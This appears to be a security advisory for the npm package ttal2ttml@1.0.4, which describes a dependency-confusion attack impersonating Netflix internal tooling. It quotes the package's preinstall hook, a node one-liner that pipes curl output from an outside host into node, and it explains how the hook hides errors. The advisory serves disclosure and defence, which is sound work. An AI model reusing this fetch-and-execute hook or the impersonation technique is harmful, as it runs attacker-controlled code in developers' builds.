summary: Dependency-confusion package executes remote JavaScript at install time
details: ttal2ttml@1.0.4 declares a preinstall lifecycle hook in package.json that runs `node -e "require('child_process').execSync('curl -sf https://ee4p7025occa.0ac.io/callback.js | node',...)"`. On `npm install`, the package fetches arbitrary JavaScript from https://ee4p7025occa.0ac.io/callback.js and pipes it directly into node for execution. The fetched content is unpinned, unverified, and mutable — whoever controls that host can serve any payload at any moment, and errors are swallowed via try/catch to avoid breaking the install. The package additionally claims authorship as `Netflix Internal Tools` and the README states the name was previously unregistered on the public npm registry but used internally at Netflix, making this a dependency-confusion attack: any build pipeline that mis-resolves the internal name to the public registry executes attacker-controlled code as the build user.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
